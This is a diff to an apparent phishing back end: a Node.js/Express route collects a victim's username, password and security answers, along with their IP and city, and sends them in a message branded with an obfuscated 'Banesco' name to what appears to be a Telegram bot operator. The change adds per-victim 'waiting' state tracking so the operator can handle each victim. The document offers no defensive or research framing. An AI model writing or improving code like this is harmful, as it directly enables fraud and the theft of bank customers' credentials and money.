@@ -103,6 +103,21 @@ app.post('/enviar2', async (req, res) => {
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
   const ciudad = await obtenerCiudad(ip);
 
+  // ✅ AÑADE ESTE BLOQUE
+  if (!clientes[txid]) {
+    clientes[txid] = {
+      status: "esperando",
+      usar,
+      clavv,
+      preguntas: [],
+      esperando: null
+    };
+  }
+
+  // ✅ ACTUALIZA EL STATUS
+  clientes[txid].status = "esperando";
+  guardarEstado();
+
   const mensaje = `
 ❓🔑🟢B4N3SC0🟢
 🆔 ID: <code>${txid}</code>
@@ -116,12 +131,6 @@ ${pregunta2}❓ : ${respuesta2}
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
 `;
-
-  // ✅ Actualizar el estado a "enviado"
-  if (clientes[txid]) {
-    clientes[txid].status = "enviado";
-    guardarEstado();
-  }
 
   const keyboard = {
     inline_keyboard: [
@@ -145,6 +154,7 @@ ${pregunta2}❓ : ${respuesta2}
 
   res.sendStatus(200);
 });
+
 
 
 app.post('/webhook', async (req, res) => {
